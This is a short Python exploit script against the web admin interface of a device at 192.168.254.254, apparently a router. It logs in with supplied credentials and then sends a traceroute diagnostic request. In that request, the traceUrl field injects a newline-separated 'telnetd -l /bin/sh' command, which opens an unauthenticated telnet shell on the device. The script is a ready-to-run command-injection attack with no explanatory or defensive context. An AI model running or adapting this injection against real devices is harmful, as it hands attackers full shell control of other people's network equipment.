import hashlib
import random
import requests
import json

def get_md5_hash(text):
    return hashlib.md5(text.encode()).hexdigest()

def main():
    username = input('Username: ')
    password = input('Password: ')

    password_hash = get_md5_hash(password)
    session_id = get_md5_hash(str(random.randint(0, 100000)))
    
    try:
        dataLogin = {
            "cmd": 100,
            "method": "POST",
            "sessionId": session_id,
            "username": username,
            "passwd": password_hash
        }
        login_response = requests.post(
            'http://192.168.254.254/cgi-bin/lua.cgi',
            headers={'Content-Type': 'application/json; charset=UTF-8'},
            data=json.dumps(dataLogin)
        )
        login_response.raise_for_status() 
        session_data = login_response.json()
        session_id = session_data.get('sessionId')
        
        dataTelnet = {
            "method": "POST",
            "cmd": 145,
            "tool": "trace_start",
            "tracePort": "",
            "traceUrl": "127.0.0.1\\ntelnetd -l /bin/sh",
            "sessionId": session_id
        }
        telnet_response = requests.post(
            'http://192.168.254.254/cgi-bin/lua.cgi',
            headers={'Content-Type': 'application/json; charset=UTF-8'},
            data=json.dumps(dataTelnet)
        )
        telnet_response.raise_for_status() 
    except requests.RequestException as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()